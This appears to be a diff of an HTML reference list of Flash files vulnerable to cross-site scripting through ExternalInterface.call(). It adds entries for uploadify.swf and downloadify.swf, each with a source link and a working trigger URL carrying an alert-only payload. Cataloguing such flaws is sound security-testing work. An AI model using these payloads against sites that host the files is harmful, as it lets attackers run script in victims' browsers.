@@ -72,10 +72,28 @@
 
     </br>
     <li>
-        io.swf : ExternalInterface.call
+        io.swf : ExternalInterface.call()
         <ul>
             <li>source - http://xforce.iss.net/xforce/xfdb/85817</li>
             <li>trigger - <b>files/io.swf?yid=\"));}catch(e){alert(9)}//</b></li>
+        </ul>
+    </li>
+
+    </br>
+    <li>
+        uploadify.swf : ExternalInterface.call()
+        <ul>
+            <li>source - http://www.madleets.com/Thread-Uploadify-v3-1-XSS-Vulnerability</li>
+            <li>trigger - <b>files/uploadify.swf?buttonText=%3Ca%20href=%27javascript:alert%289%29%27​%3ETest%3C/a%3E</b></li>
+        </ul>
+    </li>
+
+    </br>
+    <li>
+        downloadify.swf : ExternalInterface.call()
+        <ul>
+            <li>source - https://ripplelabs.atlassian.net/browse/RT-775</li>
+            <li>trigger - <b>files/downloadify.swf?queue_name=&#37;22))}catch(e){}if(!self.a)self.a=!alert('XSS');//&width&height&downloadImage=http://www.google.co.in/images/srpr/logo4w.png</b></li>
         </ul>
     </li>
 
